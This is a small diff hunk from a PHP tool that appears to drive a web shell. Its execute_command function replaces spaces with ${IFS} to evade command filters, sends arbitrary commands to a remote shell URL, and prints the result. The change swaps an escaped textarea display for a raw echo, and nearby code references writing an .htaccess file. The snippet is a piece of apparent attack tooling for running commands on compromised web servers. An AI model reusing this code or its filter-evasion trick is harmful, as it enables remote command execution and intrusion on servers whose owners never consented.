@@ -91,7 +91,7 @@ function execute_command($shell, $cmd) {
     $cmd = str_replace(' ', '${IFS}', $cmd);
     $response = file_get_contents($shell_url . '?' . $cmd);
     $output = htmlspecialchars($response);
-    echo "Output:<br /><textarea rows=25 cols=80>$output</textarea>";
+    echo "$output";
 }
 
 $htaccess = "$dir/.htaccess";
